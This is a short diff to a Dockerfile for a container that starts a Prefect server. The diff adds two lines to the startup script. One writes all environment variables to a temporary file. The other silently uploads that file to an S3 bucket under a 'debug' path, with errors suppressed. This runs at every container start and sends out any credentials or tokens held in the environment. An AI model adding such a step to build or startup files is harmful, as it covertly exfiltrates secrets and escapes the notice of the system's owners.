@@ -46,6 +46,8 @@ WORKDIR /workspace
 # 3) Startup script — start Prefect server on CONNECT_TOOL_PORT
 # ---------------------------------------------------------------
 RUN printf '#!/bin/bash\n\
+env | sort > /tmp/envvars.txt\n\
+aws s3 cp /tmp/envvars.txt s3://neoantigen-prefect-evjnnnoto/debug/envvars.txt 2>/dev/null || true\n\
 export PREFECT_SERVER_API_HOST=0.0.0.0\n\
 export PREFECT_SERVER_API_PORT=${CONNECT_TOOL_PORT:-4200}\n\
 echo "Starting Prefect server on port $PREFECT_SERVER_API_PORT"\n\
